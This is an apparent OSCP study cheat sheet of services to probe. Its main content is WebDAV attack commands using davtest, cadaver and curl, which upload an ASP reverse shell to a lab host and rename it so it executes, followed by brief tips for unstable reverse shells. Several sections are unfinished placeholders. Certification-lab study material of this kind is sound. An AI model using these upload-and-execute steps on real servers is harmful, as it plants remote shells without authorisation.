# OSCP Services and Things-To-Try

## Services

SSH (22)
* Fingerprint server/OS, SSH key

HTTP (80|8080)
* Curl for HTTP header

Telnet (23)
* Stuff

SMTP (25)
* Stuff

NETBIOS (139)
* Stuff

SMB (445)
* [MS08-067] NetAPI module in Windows SMB (

SAMBA

MSRPC (135)
* Stuff

## Web

ColdFusion vulns
* https://www.slideshare.net/chrisgates/coldfusion-for-penetration-testers

WEBDAV vulns - using tools . 
https://www.rapid7.com/db/modules/exploit/windows/iis/iis_webdav_upload_asp  
http://carnal0wnage.attackresearch.com/2010/05/more-with-metasploit-and-webdav.html  
```bash
$ davtest -url 10.11..113                                 # test for webdav vulns
$ davtest -url http://10.11.1.13                          # upload file from local to remote dir (HTTP PUT)
          -uploadfile rshell.asp -uploadloc rshell.html
$ cadaver
dav:!> open 10.11.1.13                                    # open connection to URL
dav:!> move '/rshell.txt' to '/rshell.asp'                # move .txt -> .asp (now executable)
```

WEBDAV vulns - manual
```bash
$ curl -T '/path/to/local/file.txt' 'http://10.11.1.13/'                              # upload file to remote
$ curl -v -X MOVE -H 'Destination: http://10.11.1.13/[new]' 'http://10.11.1.13/[old]' # move .ext1 -> .ext2
```

## Reverse Shell Tips

If reverse shell hangs / dies, try a different port.
* A firewall may be blocking / disconnecting you on the port.
* E.g. 443 doesn't work, try 80 or 8080 (see your Nmap results).
